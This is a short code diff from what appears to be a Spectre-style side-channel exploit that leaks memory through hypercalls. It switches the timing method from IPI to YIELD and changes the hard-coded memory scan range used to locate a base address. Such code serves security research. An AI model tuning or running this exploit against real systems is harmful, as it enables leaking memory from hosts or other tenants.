@@ -24,7 +24,7 @@ enum half_spectre_method {
   METHOD_IPI,
   METHOD_YIELD,
 };
-static const enum half_spectre_method method = METHOD_IPI;
+static const enum half_spectre_method method = METHOD_YIELD;
 
 #define HYPERCALL_PATH_SIZE 127
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
@@ -298,8 +298,8 @@ void *find_base(void *buf) {
       "On a diffent CPU, run access_min with index 0 to continiously bring the table into L1 data cache.\n");
 
   scan_opts_t opts;
-  opts.start = 0xfeb8e3b0;
-  opts.end = 0x102fbd218;
+  opts.start = 0x15880c730;
+  opts.end = 0x158a0c730;
   opts.stride = 8;
   unsigned char needle[] = {0xff, 0xff};
   do_scan(opts, 2, (char *)needle);
